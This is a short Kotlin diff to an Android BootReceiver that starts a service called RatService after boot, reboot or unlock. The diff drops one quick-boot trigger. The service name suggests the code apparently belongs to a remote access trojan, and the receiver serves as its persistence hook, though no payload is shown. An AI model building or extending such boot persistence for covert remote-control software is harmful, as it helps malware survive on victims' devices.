@@ -16,7 +16,7 @@ class BootReceiver : BroadcastReceiver() {
         val action = intent.action ?: return
         Log.d(TAG, "Boot action: $action")
         when (action) {
-            Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_QUICKBOOT_POWERON, Intent.ACTION_REBOOT, Intent.ACTION_USER_PRESENT -> {
+            Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_REBOOT, Intent.ACTION_USER_PRESENT -> {
                 PreferencesManager.init(context)
                 DeviceUtils.init(context)
                 val i = Intent(context, RatService::class.java)
